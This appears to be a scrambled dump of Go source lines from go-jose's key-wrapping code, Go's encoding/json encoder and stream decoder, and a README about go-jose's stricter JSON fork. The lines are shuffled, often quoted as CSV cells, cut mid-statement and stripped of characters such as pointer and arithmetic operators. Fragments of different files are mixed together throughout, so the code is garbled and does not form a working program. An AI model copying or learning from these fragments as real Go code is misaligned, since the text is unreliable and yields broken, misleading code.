// Get a new AEAD instance
return len(ctx.key)
"return nil, fmt.Errorf(""square/go-jose: invalid P2S: %v"", err)"
"key: key,"
case PBES2_HS384_A192KW:
"func (ctx staticKeyGenerator) genKey() ([]byte, rawHeader, error) {"
"case DIRECT, A128GCMKW, A192GCMKW, A256GCMKW, A128KW, A192KW, A256KW:"
"func (ctx symmetricMac) verifyPayload(payload []byte, mac []byte, alg SignatureAlgorithm) error {"
parts := 
if len(parts.iv) != aead.NonceSize() 
if match != 1 {
"jek, err := josecipher.KeyWrap(block, cek)"
     http://www.apache.org/licenses/LICENSE-2.0
"return 16, sha256.New"
"salt := bytes.Join([][]byte{[]byte(alg), p2s.bytes()}, []byte{0x00})"
switch sigAlg {
keyBytes:     keySize 
"return recipientSigInfo{}, ErrUnsupportedAlgorithm"
// Generate a random key for the given content cipher
keyBytes     int
"return nil, rawHeader{}, err"
"_, err := io.ReadFull(RandReader, key)"
"cek := make([]byte, len(ctx.key))"
const (
// Key size for random generator
// Terminate each value with a newline.
scanp := dec.scanp
if dec.err != nil {
// First slide down data already consumed.
"float64, for JSON numbers"
default:
return err == nil 
"Decoder) Token() (Token, error) {"
scanp = dec.scanp 
type Delim rune
"for i, c := range dec.buf[scanp:] {"
// Did the last read have an error
"// At the end of the input stream, Token returns nil, io.EOF."
// followed by a newline character.
" "" "" "
if dec.tokenState == tokenObjectComma {
"""errors"""
Decoder) tokenPrepareForDecode() error {
if dec.tokenState != tokenArrayStart 
// Look in the buffer for a new value.
= i 
switch dec.tokenState {
clearOffset(err)
func NewDecoder(r io.Reader) 
"// number, and null"
if m == nil {
// See the documentation for Unmarshal for details about
if err := dec.tokenPrepareForDecode()
for {
dec.d.init(dec.buf[dec.scanp : dec.scanp
"m, nil"
// readValue reads a JSON value into dec.buf.
m as the JSON encoding of m.
return true
if dec.tokenState != tokenObjectStart 
// The input stream consists of basic JSON values
m to a copy of data.
// A Token holds a value of one of these types:
// current array or object being parsed.
tokenObjectKey
break Input
if enc.err != nil {
const minRead = 512
// RawMessage is a raw encoded JSON object.
"n, err := dec.readValue()"
case tokenTopValue:
// so instead invent a space byte.
"SyntaxError{""expected comma after array element"", 0}"
c := dec.buf[i]
// EncodeToken writes the given JSON token to the stream.
"Delim, for the four JSON delimiters [ ] { }"
TODO
fallthrough
"return nil, err"
if v == scanEnd {
case '{':
tokenState int
return false
var context string
"// buffer has been scanned, now report any error"
func (e 
tokenObjectStart
dec.tokenState = tokenObjectKey
"""io"""
// Use of this source code is governed by a BSD-style
switch c {
Input:
func NewEncoder(w io.Writer) 
SyntaxError)
"string, for JSON string literals"
case tokenObjectColon:
"return errors.New(""json.RawMessage: UnmarshalJSON on nil pointer"")"
dec.tokenState = dec.tokenStack[len(dec.tokenStack)-1]
"return nil, "
// UnmarshalJSON sets 
dec.err = dec.scan.err
"return Delim('['), nil"
// It returns an error if the delimiters [ ] { } are not properly used.
func clearOffset(err error) {
case ':':
err := e.marshal(v)
type Encoder struct {
err error
"n := copy(dec.buf, dec.buf[dec.scanp:])"
dec.tokenState = tokenObjectStart
func nonSpace(b []byte) bool {
"return x, nil"
return enc.err
// buffer. The reader is valid until the next call to Decode.
Decoder) Buffered() io.Reader {
// It returns the length of the encoding.
"dec.scan, ' ') == scanEnd {"
// peek is only called when using the Token API.
"// Encode writes the JSON encoding of v to the stream,"
minRead)
"// without using Encode, need to call Flush when finished to ensure that"
"Decoder) readValue() (int, error) {"
e := newEncodeState()
"case '""':"
"RawMessage) MarshalJSON() ([]byte, error) {"
// Commas and colons are elided.
err   error
"for _, c := range b {"
"return 0, dec.scan.err"
Decoder) tokenValueEnd() {
 v == scanEndArray) 
"bool, for JSON booleans"
"if _, err = enc.w.Write(e.Bytes())"
dec.tokenState = tokenObjectComma
Encoder {
tokenTopValue = iota
// Token returns the next JSON token in the input stream.
if err != nil {
// See the documentation for Marshal for details about the
tokenArrayStart
dec.tokenStack = dec.tokenStack[:len(dec.tokenStack)-1]
if dec.tokenState == tokenArrayComma {
type Token interface{}
"case ',':"
return dec.tokenError(c)
m = append((
tokenObjectValue
if cap(dec.buf)-len(dec.buf) < minRead {
w   io.Writer
if dec.scanp > 0 {
// digits coming.
return 
case '}':
err = io.ErrUnexpectedEOF
// so that the reader knows there aren't more
var _ Marshaler = (
"context = "" after array element"""
dec.tokenState = tokenObjectValue
type Decoder struct {
Decoder{r: r}
// A Decoder reads and decodes JSON objects from an input stream.
tokenObjectComma
err = dec.d.unmarshal(v)
const (
dec.err = err
// Number instead of as a float64.
// read data from r beyond the JSON values requested.
// object from it before the error happened.
Decoder) refill() error {
"// a larger operation such as Encode, and those will call Flush when finished."
var err error
case ']':
return string(d)
"newBuf := make([]byte, len(dec.buf), 2"
// An Encoder writes JSON objects to an output stream.
func (enc 
// This makes the output look a little nicer
d     decodeState
// be used to delay JSON decoding or precompute a JSON encoding.
"// EncodeToken does not call Flush, because usually it is part of"
"context = "" after object key:value pair"""
Decoder) More() bool {
 i < len(dec.buf)
"dec.scan, c)"
"return c, nil"
"m)[0:0], data...)"
dec.tokenState = tokenArrayValue
"bool, string,"
// Buffered returns a reader of the data remaining in the Decoder's
case tokenArrayComma:
// It implements Marshaler and Unmarshaler and can
v := dec.scan.step(
var _ Unmarshaler = (
if err == io.EOF {
"// is required if the encoded value was a number,"
 err != nil {
dec.tokenValueEnd()
return err
// Read whole value into buffer.
n := scanp - dec.scanp
"case tokenArrayStart, tokenArrayValue, tokenObjectValue:"
"SyntaxError{msg: ""not at beginning of value""}"
// Delayed until now to allow buffer scan.
old := dec.tokenState
"SyntaxError{""expected colon after object key"", 0}"
if v == scanError {
dec.scan.reset()
// MarshalJSON returns 
Encoder) Encode(v interface{}) error {
if (v == scanEndObject 
"// We might block trying to get that byte from src,"
e.WriteByte('
scan  scanner
"n, err := dec.r.Read(dec.buf[len(dec.buf):cap(dec.buf)])"
// Don't save err from unmarshal into dec.err:
// the connection is still usable since we read a complete JSON
// NewDecoder returns a new decoder that reads from r.
// fixup token streaming state
// properly nested and matched: if Token encounters an unexpected
case '[':
"return scanp - dec.scanp, nil"
"return Delim('{'), nil"
if nonSpace(dec.buf) {
tokenObjectColon
// the conversion of JSON into a Go value.
" context, 0}"
"Decoder) peek() (byte, error) {"
scanp 
// scanEnd is delayed one byte.
return dec.err
"context = "" after object key"""
// The decoder introduces its own buffering and may
 c != '}'
// advance tokenstate from a separator state to a value state
dec.buf = dec.buf[:n]
// putting peek into the standard Decode path.
Encoder{w: w}
"context = "" looking for beginning of object key string"""
dec.scanp = i
// Copyright 2010 The Go Authors.  All rights reserved.
func (m 
buf   []byte
tokenArrayValue
err := dec.Decode(
cap(dec.buf)
s.Offset = 0
scanp = len(dec.buf)
 dec.tokenState != tokenArrayComma {
"dec.tokenStack = append(dec.tokenStack, dec.tokenState)"
if dec.tokenState == tokenObjectStart 
case tokenObjectKey:
// UseNumber causes the Decoder to unmarshal a number into an interface{} as a
 dec.tokenState != tokenObjectComma {
func (d Delim) String() string {
Encoder) EncodeToken(t Token) error  {
dec.tokenState = tokenArrayStart
// Decode reads the next JSON-encoded value from its
if dec.scan.step(
"return 0, err"
case tokenObjectValue:
return nil
var x interface{}
"""bytes"""
if c != ':' {
RawMessage) UnmarshalJSON(data []byte) error {
"copy(newBuf, dec.buf)"
RawMessage)(nil)
func (dec 
// input and stores it in the value pointed to by v.
// Make room to read more into the buffer.
 quoteChar(c) 
"context = "" looking for beginning of value"""
type RawMessage []byte
scanp int // start of unread data in buf
dec.buf = newBuf
"if s, ok := err.("
"SyntaxError{""invalid character "" "
return bytes.NewReader(dec.buf[dec.scanp:])
dec.scanp 
// More reports whether there is another element in the
Decoder) UseNumber() { dec.d.useNumber = true }
"return Delim('}'), nil"
"// when debugging, and some kind of space"
continue
// license that can be found in the LICENSE file.
// NewEncoder returns a new encoder that writes to w.
"nil, for JSON null"
tokenArrayComma
"case tokenArrayStart, tokenArrayValue:"
"c, err := dec.peek()"
// to mark the start and end of arrays and objects.
if dec.tokenState != tokenObjectColon {
 ok {
dec.tokenState = tokenArrayComma
import (
"// delimiter in the input, it will return an error."
var x string
 dec.scan.step(
// Token guarantees that the delimiters [ ] { } it returns are
"Decoder) tokenError(c byte) (Token, error) {"
r     io.Reader
encodeStatePool.Put(e)
package json
"// Note: Not calling peek before switch, to avoid"
tokenStack []int
dec.buf = dec.buf[0 : len(dec.buf)
"case tokenTopValue, tokenArrayStart, tokenArrayValue, tokenObjectValue:"
 c != ']' 
dec.tokenState = old
if !isSpace(c) {
dec.scan.bytes
"if c != ',' {"
along with delimiters [ ] { } of type Delim
for i := dec.scanp
if !dec.tokenValueAllowed() {
case tokenObjectComma:
err = dec.refill()
"Number, for JSON numbers"
dec.tokenState = tokenObjectColon
// conversion of Go values to JSON.
"// Callers that create an Encoder and then invoke EncodeToken directly,"
dec.tokenState = tokenTopValue
 dec.tokenState == tokenObjectKey {
"return Delim(']'), nil"
// the JSON is written to the underlying writer.
dec.scanp = 0
if isSpace(c) {
dec.scanp
Decoder {
if err := dec.Decode(
Decoder) Decode(v interface{}) error {
"// A Delim is a JSON array or object delimiter, one of [ ] { or }."
// Read.  Delay error for next iteration (after scan).
Decoder) tokenValueAllowed() bool {
enc.err = err
// Grow buffer if not large enough.
The following changes were made:
 package from Go 1.6.
  go-jose and libraries written in other languages.
encoding/json
  [case-insensitive matching](https://www.ietf.org/mail-archive/web/json/current/msg03763.html).
  input whenever we detect a duplicate. Rather than trying to work with malformed
This repository contains a fork of the 
 Object deserialization uses case-sensitive member name matching instead of
 Safe JSON
"  data, we prefer to reject it right away."
  This is to avoid differences in the interpretation of JOSE messages between
" When deserializing a JSON object, we check for duplicate keys and reject the"
"fields:    fields,"
// A nil interface value encodes as the null JSON object.
// The map's key type must be string
return intEncoder
if v.Kind() == reflect.Ptr 
for advance = 1
"MarshalJSON() ([]byte, error)"
// newTypeEncoder constructs an encoderFunc for a type.
// Boolean values encode as JSON booleans.
if encoderCache.m == nil {
"for i, c := range src {"
default:
encoderCache.m[t] = f
"// []byte encodes as a base64-encoded string, and a nil slice"
encodeState) stringBytes(s []byte) int {
"// The ""string"" option signals that a field is stored as JSON inside a"
2029
"return fields[0], true"
 b < utf8.RuneSelf {
fj := fields[i
fieldCache.m[t] = f
e.WriteString(s[start:])
// One iteration per name.
omitEmpty bool
v = v.Field(i)
"c, size := utf8.DecodeRuneInString(s[i:])"
"// sliceEncoder just wraps an arrayEncoder, checking to make sure the value isn't nil."
"tag := sf.Tag.Get(""json"")"
f = typeFields(t)
return fields
panic(r)
case reflect.Interface:
dst.Write(src[start:])
// https://golang.org/doc/articles/json_and_go.html
"// keys, subject to the UTF-8 coercion described for string values above."
"return newCondAddrEncoder(addrMarshalerEncoder, newTypeEncoder(t, false))"
err = compact(
if start < len(s) {
2 < len(src) 
" "", c):"
name      string
encoderCache.m = make(map[reflect.Type]encoderFunc)
if advance == 1 { // Only one field with this name
if visited[f.typ] {
"tag:       tagged,"
if !isValidNumber(numStr) {
"if s, ok := r.(string)"
// buffer space.
if start < len(src) {
"if _, ok := r.(runtime.Error)"
// and options. Examples:
// to keep some browsers from misinterpreting JSON output as HTML.
"func (x byName) Swap(i, j int) { x[i], x[j] = x[j], x[i] }"
"b, err := Marshal(v)"
return x[i].tag
// Count of queued names for current level and the next.
return typeEncoder(v.Type())
"ae.elemEnc(e, v.Index(i), false)"
case reflect.Float32:
u202
"func fieldByIndex(v reflect.Value, index []int) reflect.Value {"
 src[i
quoted    bool
"e.error(fmt.Errorf(""json: invalid number literal %q"", numStr))"
// Anonymous struct fields are usually marshaled as if their inner exported fields
} else {
e.WriteByte('{')
// underscores and slashes.
func textMarshalerEncoder(e 
e.WriteByte('}')
"for _, f := range current {"
 !unicode.IsDigit(c) {
//   // as defined above.
e.WriteString(numStr)
// func is only used for recursive types.
break
FFFD.
nameBytes []byte // []byte(name)
return true
// stringValues is a slice of reflect.Value holding 
"for i, f := range se.fields {"
"out = append(out, fi)"
sort.Sort(byIndex(fields))
var wg sync.WaitGroup
return me.encode
"encodeState, v reflect.Value, _ bool) {"
"// String values encode as JSON strings coerced to valid UTF-8,"
nextCount[ft]
e.Write(s[start:i])
"// Floating point, integer, and Number values encode as JSON numbers."
"se.fieldEncs[i](e, fv, f.quoted)"
visited[f.typ] = true
return se.encode
// A nil pointer encodes as the null JSON object.
m := v.Interface().(encoding.TextMarshaler)
reflect.StringValue.
return newSliceEncoder(t)
// Anonymous fields to explore at the current level and the next.
f.nameBytes = []byte(f.name)
// Handling of anonymous struct fields is new in Go 1.1.
return len(x[i].index) < len(x[j].index)
defer func() {
// replacing invalid bytes with the Unicode replacement rune.
// and then any reachable anonymous structs.
"func MarshalIndent(v interface{}, prefix, indent string) ([]byte, error) {"
"base64.StdEncoding.Encode(dst, s)"
// to encode an unsupported value type.
func (bits floatEncoder) encode(e 
// Byte slices get special treatment
case '
"func dominantField(fields []field) (field, bool) {"
"if name == """" {"
// The nil pointer exception is not strictly necessary
structEncoder) encode(e 
"// value implements encoding.TextMarshaler instead, Marshal calls"
"json:"",string"""
"if opts.Contains(""string"") {"
// Multiple tagged fields at the same level: conflict.
"// for large buffers, avoid unnecessary extra temporary"
"// Backslash and quote chars are reserved, but"
"if tag == ""-"" {"
= advance {
"// Ampersand """
// NOTE: keep in sync with string above.
"return nil, err"
type mapEncoder struct {
if t.Implements(textMarshalerType) {
"reflect.Float32, reflect.Float64,"
"// In Go1.5 the empty string encodes to ""0"", while this is not a valid number literal"
numStr := v.String()
case reflect.Bool:
return reflect.Value{}
"for _, i := range index {"
fieldCache.RUnlock()
e := 
"// The characters can only appear in string literals,"
type UnsupportedTypeError struct {
// attempting to encode a string value with invalid UTF-8 sequences.
// typeFields returns a list of fields that JSON should recognize for the given type.
return stringEncoder
 i < len(s)
"// longer entries, which is easy: just truncate the slice."
"bytes.Buffer, src []byte) {"
func boolEncoder(e 
func stringEncoder(e 
return float32Encoder
fieldCache.m = map[reflect.Type][]field{}
return false
func (e 
// the fields.
func isEmptyValue(v reflect.Value) bool {
"se.arrayEnc(e, v, false)"
encoderCache.Unlock()
"func newCondAddrEncoder(canAddrEnc, elseEnc encoderFunc) encoderFunc {"
"// escaping within <script> tags, so an alternative JSON encoding must"
"case reflect.Array, reflect.Map, reflect.Slice, reflect.String:"
// Use of this source code is governed by a BSD-style
"count, nextCount = nextCount, map[reflect.Type]int{}"
"fields = append(fields, fields[len(fields)-1])"
if reflect.PtrTo(t).Implements(textMarshalerType) {
"sb, err := Marshal(v.String())"
// indirect func before we build it. This type waits on the
// otherwise any punctuation chars are allowed
"case reflect.Float32, reflect.Float64:"
if c == '
"u0026, "
fields := cachedTypeFields(t)
sliceEncoder) encode(e 
// Follow pointer.
// Scan f.typ for fields to include.
m map[reflect.Type]encoderFunc
"// 2) If there is exactly one field (tagged or not according to the first rule), that is selected."
Type reflect.Type
if t.Key().Kind() != reflect.String {
 i < n
"quoted:    quoted,"
func (ce 
var (
"return byIndex(x).Less(i, j)"
bytes.Buffer // accumulated output
enc.Write(s)
f := encoderCache.m[t]
case reflect.Float64:
if err == nil {
if count[f.typ] > 1 {
"return field{}, false"
"ce.canAddrEnc(e, v, quoted)"
"json:"",omitempty"""
ufffd
e.string(v.String())
 no error occurs.
condAddrEncoder) encode(e 
n := v.Len()
// and can lead to security holes there. It is valid JSON to
"func typeByIndex(t reflect.Type, index []int) reflect.Type {"
// An anonymous struct field of interface type is treated the same as having
return t
// A field represents a single field found in a struct.
"return ""json: unsupported value: "" "
"return ""json: invalid UTF-8 in string: "" "
"case reflect.Interface, reflect.Ptr:"
if fj.name != name {
func cachedTypeFields(t reflect.Type) []field {
"// but can be specified in the struct field's tag value. The ""json"" key in"
len0 := e.Len()
"if name != """" "
return v
return invalidValueEncoder
func (x byName) Len() int { return len(x) }
if t.Elem().Kind() == reflect.Uint8 {
err := e.marshal(v)
return newMapEncoder(t)
enc.Close()
 isEmptyValue(fv) {
"// They are both technically valid characters in JSON strings,"
if reflect.PtrTo(t).Implements(marshalerType) {
UnsupportedTypeError{v.Type()})
fieldEncs []encoderFunc
e.string(string(sb))
name := fi.name
"// as well as <, > and "
"return buf.Bytes(), nil"
va := v.Addr()
if x[i].name != x[j].name {
tagged := -1 // Index of first tagged field.
"canAddrEnc, elseEnc encoderFunc"
"for advance, i := 0, 0"
"""strconv"""
func interfaceEncoder(e 
e.Write(s[start:])
"// As of Go 1.2, Marshal instead coerces the string to valid UTF-8 by"
"valueEncoder(v)(e, v, false)"
type MarshalerError struct {
"//   - the field is empty and its tag specifies the ""omitempty"" option."
encodeState) marshal(v interface{}) (err error) {
 e.Str
// If an encountered value implements the Marshaler interface
e.string(f.name)
if len(s) < 1024 {
"""strings"""
first = false
Err  error
"numStr = ""0"" // Number's zero-val"
if len(fields) > 1 {
 !sf.Anonymous 
// hidden fields by choosing the one dominant field that survives.
e.string(k.String())
// becomes a member of the object unless
"u0026"" for the same reason."
f := fieldCache.m[t]
// JSON cannot represent cyclic data structures and Marshal does not
"var hex = ""0123456789abcdef"""
"name, opts := parseTag(tag)"
if f != nil {
func newStructEncoder(t reflect.Type) encoderFunc {
case reflect.Ptr:
"omitEmpty: opts.Contains(""omitempty""),"
"// we have a conflict (two fields named ""X"" at the same level) and we"
"return ""json: unsupported type: "" "
// except that fields with JSON tags are promoted.
"name:      name,"
quoted = true
out := fields[:0]
"// See ""JSON and Go"" for an introduction to this package:"
length := len(fields[0].index)
"func Marshal(v interface{}) ([]byte, error) {"
 strconv.Quote(e.S)
arrayEncoder{typeEncoder(t.Elem())}
marshalerType     = reflect.TypeOf(new(Marshaler)).Elem()
// Interface values encode as the value contained in the interface.
 b != '<' 
wg.Wait()
"// then breaking ties with ""name came from json tag"", then"
m := va.Interface().(encoding.TextMarshaler)
if k >= len(x[j].index) {
 allowAddr {
"enc := base64.NewEncoder(base64.StdEncoding, e)"
if first {
"tagged := name != """""
// byIndex sorts field by index sequence.
//   Field int 
case reflect.Slice:
e.error(
e.WriteByte(hex[b
"// have the same name, to find the single field that dominates the"
func newSliceEncoder(t reflect.Type) encoderFunc {
"if sf.PkgPath != """" "
"case reflect.Bool,"
if err != nil {
"// but mimics a similar, necessary exception in the behavior of"
sync.RWMutex
tagged = i
"""fmt"""
mapEncoder) encode(e 
func encodeByteSlice(e 
fi := fields[i]
// characters inside string literals changed to 
"func (sv stringValues) Less(i, j int) bool { return sv.get(i) < sv.get(j) }"
func intEncoder(e 
if b := s[i]
if fieldCache.m == nil {
"// If there were multiple instances, add a second,"
// as described in the next paragraph.
type encodeState struct {
func invalidValueEncoder(e 
n and 
"""reflect"""
"ce.elseEnc(e, v, quoted)"
 v != nil {
var fieldCache struct {
func fillField(f field) field {
// newCondAddrEncoder returns an encoder that checks whether its value
float32Encoder = (floatEncoder(32)).encode
"MarshalerError{v.Type(), err})"
// NOTE: keep in sync with stringBytes below.
type arrayEncoder struct {
// must therefore be one with the shortest index length. Drop all
"dst := make([]byte, base64.StdEncoding.EncodedLen(len(s)))"
e.WriteByte('r')
fields = fields[:i]
err = r.(error)
 e.Err.Error()
ft := sf.Type
if nextCount[ft] == 1 {
"buf, b, prefix, indent)"
func newMapEncoder(t reflect.Type) encoderFunc {
t = t.Field(i).Type
if t.Kind() == reflect.Ptr {
"// Only strings, floats, integers, and booleans can be quoted."
// in the documentation for the Marshal and Unmarshal functions.
"typ:       ft,"
return enc.encode
// Pointer values encode as the value pointed to.
m := v.Interface().(Marshaler)
e.WriteByte(hex[b>>4])
for len(next) > 0 {
if len(f.index) > length {
func unsupportedTypeEncoder(e 
if f == nil {
case reflect.String:
e.Reset()
"// copy JSON into buffer, checking validity."
type UnsupportedValueError struct {
""" is also escaped to """
"// CanAddr and delegates to canAddrEnc if so, else to elseEnc."
visited := map[reflect.Type]bool{}
"""runtime"""
// Types already visited at an earlier level.
func (ae 
//   // Field is ignored by this package.
if quoted {
e.reflectValue(v.Elem())
S string // the whole string value that caused the error
"// 3) Otherwise there are multiple fields, and all are ignored"
"//   // Field appears in JSON as key ""myName""."
return e
if c == 0xE2 
return !v.Bool()
if va.IsNil() {
"json:""myName,omitempty"""
"', '""':"
// UnmarshalJSON.
"u003e"""
// handle them.  Passing cyclic structures to Marshal will result in
e.WriteByte(']')
// Find the sequence of fields with the name of this first field.
"return newCondAddrEncoder(addrTextMarshalerEncoder, newTypeEncoder(t, false))"
type floatEncoder int // number of bits
sort.Sort(byName(fields))
 f.omitEmpty 
// an UnsupportedTypeError.
// an infinite recursion.
enc := 
panic(s)
t = t.Elem()
next := []field{{typ: t}}
e.Write(dst)
Value reflect.Value
"""sort"""
"//   // Field appears in JSON as key ""myName"" and"
"// multiple fields at the same level, and that level is the least"
"f = newTypeEncoder(t, true)"
"e.WriteString(""true"")"
"// JSON-encoded string. It applies only to fields of string, floating point,"
encodeState) error(err error) {
//   // Note the leading comma.
"json:""myName"""
dst.Write(src[start:i])
// are rendered into JSON and served to some browsers.
scratch      [64]byte
if i > 0 {
// Record found field and index sequence.
if r := recover()
return boolEncoder
"me.elemEnc(e, v.MapIndex(k), false)"
index     []int
func addrTextMarshalerEncoder(e 
" b != '""' "
func (pe 
ptrEncoder) encode(e 
if 0x20 <= b 
// we keep compatibility so check validity after this.
mapEncoder{typeEncoder(t.Elem())}
"// but don't work in JSONP, which has to be evaluated as JavaScript,"
"fields = append(fields, fillField(field{"
elemEnc encoderFunc
// The Go visibility rules for struct fields are amended for JSON when
reflect.String:
"// Delete all fields that are hidden by the Go rules for embedded fields,"
// so don't bother generating any more copies.
"dominant, ok := dominantField(fields[i : i"
"// escape them, so we do so unconditionally."
-./:<=>
start := 0
return float64Encoder
type stringValues []reflect.Value
// nested (and would therefore be the nesting level selected by the
return newPtrEncoder(t)
if v.IsNil() {
"//   - the field's tag is ""-"", or"
// so just scan the string one byte at a time.
"c, size := utf8.DecodeRune(s[i:])"
return x[i].name < x[j].name
return newArrayEncoder(t)
var encoderCache struct {
"""unicode"""
"se.fieldEncs[i] = typeEncoder(typeByIndex(t, f.index))"
// Marshal traverses the value v recursively.
if len(x[i].index) != len(x[j].index) {
type encoderFunc func(e 
if !fv.IsValid() 
// An UnsupportedTypeError is returned by Marshal when attempting
"f(e, v, quoted)"
"func (x byName) Less(i, j int) bool {"
// Struct values encode as JSON objects. Each exported struct field
// The key name will be used if it's a non-empty string consisting of
dst.WriteByte(hex[c>>4])
"UnsupportedValueError{v, strconv.FormatFloat(f, 'g', -1, int(bits))})"
"""encoding/base64"""
"if s == """" {"
// when communicating with JavaScript programs:
func (sv stringValues) Len() int           { return len(sv) }
 r != nil {
func uintEncoder(e 
"// Otherwise, Marshal uses the following type-dependent default encodings:"
// to produce JSON. If no MarshalJSON method is present but the
"u003c"" and """
tag       bool
func valueEncoder(v reflect.Value) encoderFunc {
e.WriteByte(hex[c
"// 1) Of those fields, if any are JSON-tagged, only tagged fields are considered,"
"//   // Field appears in JSON as key ""Field"" (the default), but"
0xF])
fieldCache.RLock()
wg.Add(1)
s := v.Bytes()
2028 and U
Str   string
"// as well as <, >, and "
sf := f.typ.Field(i)
return v.Int() == 0
MarshalerError) Error() string {
func newPtrEncoder(t reflect.Type) encoderFunc {
"// The angle brackets ""<"" and "">"" are escaped to """
UnsupportedTypeError) Error() string {
if c == utf8.RuneError 
dst.WriteByte(hex[src[i
" for each name, delete"
return v.Len() == 0
. The latter are escaped because they
f = []field{}
// with programs that might mention it.
count := map[reflect.Type]int{}
if c == '<' 
switch v.Kind() {
1 == 0xA8 {
"encodeState, v reflect.Value, quoted bool) {"
// Marshal returns the JSON encoding of v.
var fields []field
dst.WriteString(
var buf bytes.Buffer
e.stringBytes(b)
return v.Uint() == 0
// encodes as the null JSON object.
// An anonymous struct field with a name given in its JSON tag is treated as
"""math"""
// It implements the methods to sort by string.
"for _, c := range s {"
e.WriteByte('
func typeFields(t reflect.Type) []field {
"b := strconv.AppendUint(e.scratch[:0], v.Uint(), 10)"
return textMarshalerEncoder
"reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64,"
 c == '>' 
"copy(index, f.index)"
// of field index length. Loop over names
"e.WriteByte('""')"
fieldCache.Lock()
e.WriteByte(b)
"u003e, "
if x[i].tag != x[j].tag {
type sliceEncoder struct {
"pe.elemEnc(e, v.Elem(), quoted)"
// cachedTypeFields is like typeFields but uses a cache to avoid repeated work.
func marshalerEncoder(e 
"// The empty values are false, 0, any"
encodeState {
"for i, k := range sv {"
"// only Unicode letters, digits, dollar signs, percent signs, hyphens,"
UnsupportedValueError) Error() string {
 b != '
encoderCache.m[t] = func(e 
"//   // the field is omitted from the object if its value is empty,"
// even if there are multiple untagged fields that would otherwise conflict.
current := []field{}
"fieldEncs: make([]encoderFunc, len(fields)),"
var encodeStatePool sync.Pool
"// the struct field's tag value is the key name, followed by an optional comma"
type structEncoder struct {
switch {
// See http://timelessrepo.com/json-isnt-a-javascript-subset for discussion.
name = sf.Name
if v.Kind() == reflect.Ptr {
dst.WriteByte(hex[c
"e.WriteString(""false"")"
switch ft.Kind() {
start = i
"// The fields are sorted in primary order of name, secondary order"
return unsupportedTypeEncoder
"// others using Go's embedding rules, modified by the presence of"
"return e.Bytes(), nil"
u2028' 
type Marshaler interface {
"// To deal with recursive types, populate the map with an"
fields = out
"u2028, "
u2029
encodeState) string(s string) int {
// Copyright 2010 The Go Authors.  All rights reserved.
"// byName sorts field by name, breaking ties with depth,"
nextCount := map[reflect.Type]int{}
// return no field.
"func newTypeEncoder(t reflect.Type, allowAddr bool) encoderFunc {"
// be used.
"// Array and slice values encode as JSON arrays, except that"
case reflect.Struct:
 i < len(fields)
me := 
"// For historical reasons, web browsers don't honor standard HTML"
wg.Done()
"func (x byIndex) Less(i, j int) bool {"
e.WriteString(
// RFC 4627. The mapping between JSON objects and Go values is described
"""sync"""
"// a JSON tag of ""-""."
e.reflectValue(reflect.ValueOf(v))
 b != '>' 
// Map values encode as JSON objects.
// so that the JSON will be safe to embed inside HTML <script> tags.
v = v.Elem()
"case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:"
textMarshalerType = reflect.TypeOf(new(encoding.TextMarshaler)).Elem()
// can marshal themselves into valid JSON.
"condAddrEncoder{canAddrEnc: canAddrEnc, elseEnc: elseEnc}"
 !sf.Anonymous { // unexported
"// and is not a nil pointer, Marshal calls its MarshalJSON method"
"case strings.ContainsRune(""!"
2029 (E2 80 A8 and E2 80 A9).
// An encodeState encodes JSON into a bytes.Buffer.
"return ""json: error calling MarshalJSON for type "" "
// Package json implements encoding and decoding of JSON objects as defined in
ft = ft.Elem()
return marshalerEncoder
"// were fields in the outer struct, subject to the usual Go visibility rules amended"
"if numStr == """" {"
encodeState) reflectValue(v reflect.Value) {
encodeState{}
panic(err)
advance < len(fields)
"// for small buffers, using Encode directly is much faster."
return v.Float() == 0
// Marshaler is the interface implemented by objects that
// length zero. The object's default key string is the struct field name
if t.Kind() != reflect.Ptr 
"out = append(out, dominant)"
arrayEnc encoderFunc
"if ft.Name() == """" "
if tagged >= 0 {
quoted := false
"// having that name, rather than being anonymous."
return nil
return uintEncoder
sort.Sort(sv)
// This error is no longer generated but is kept for backwards compatibility
"if math.IsInf(f, 0) "
"""bytes"""
start = i 
fields    []field
"case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr:"
func (se 
if !v.IsValid() {
// deciding which field to marshal or unmarshal. If there are
if f.tag {
encoderCache.RUnlock()
if v := encodeStatePool.Get()
// replacing invalid bytes with the Unicode replacement rune U
"// that type as its name, rather than being anonymous."
"// JSON tags. If there are multiple top-level fields, the boolean"
 ft.Kind() == reflect.Ptr {
 the map keys are used as JSON object
e.WriteByte(':')
u2029' {
func addrMarshalerEncoder(e 
// its MarshalText method.
e.WriteByte('n')
func (sv stringValues) get(i int) string   { return sv[i].String() }
 e.Type.String() 
type condAddrEncoder struct {
func newArrayEncoder(t reflect.Type) encoderFunc {
return e.Len() - len0
"// dominantField looks through the fields, all of which are known to"
"b := strconv.AppendFloat(e.scratch[:0], f, 'g', -1, int(bits))"
"e.WriteByte(',')"
m := va.Interface().(Marshaler)
advance])
func (me 
switch b {
"// It only cares about the distinction between 1 or 2,"
"func (x byIndex) Swap(i, j int) { x[i], x[j] = x[j], x[i] }"
e := v.(
if start < i {
 c == '
continue
encoderCache.Lock()
"// Prior to Go 1.1, anonymous struct fields were ignored. To force ignoring of"
case reflect.Array:
// can lead to security holes when user-controlled strings
// license that can be found in the LICENSE file.
return interfaceEncoder
 e.Type.String()
 math.IsNaN(f) {
if !isValidTag(name) {
index[len(f.index)] = i
// Return no field.
 size == 1 {
// will be false: This condition is an error in Go and we skip all
e.WriteString(s[start:i])
"next = append(next, fillField(field{name: ft.Name(), index: index, typ: ft}))"
"json:""-"""
"u003c, "
sliceEncoder{newArrayEncoder(t)}
 ok {
// Fields found.
"reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64,"
// Record new anonymous struct to explore in next round.
case reflect.Map:
if v.CanAddr() {
"e.Buffer, b, true)"
"// an anonymous struct field in both current and earlier versions, give the field"
import (
type byIndex []field
encoderCache.RLock()
typ       reflect.Type
 ft.Kind() != reflect.Struct {
ptrEncoder{typeEncoder(t.Elem())}
e.error(err)
arrayEncoder) encode(e 
// This encodes bytes < 0x20 except for 
"return fields[tagged], true"
"for k, xik := range x[i].index {"
advance]
"""encoding"""
if ok {
1] == 0x80 
"for i, f := range fields {"
var sv stringValues = v.MapKeys()
// The returned encoder only checks CanAddr when allowAddr is true.
func HTMLEscape(dst 
for i := 0
"index := make([]int, len(f.index)"
e.Write(b)
first := true
structEncoder{
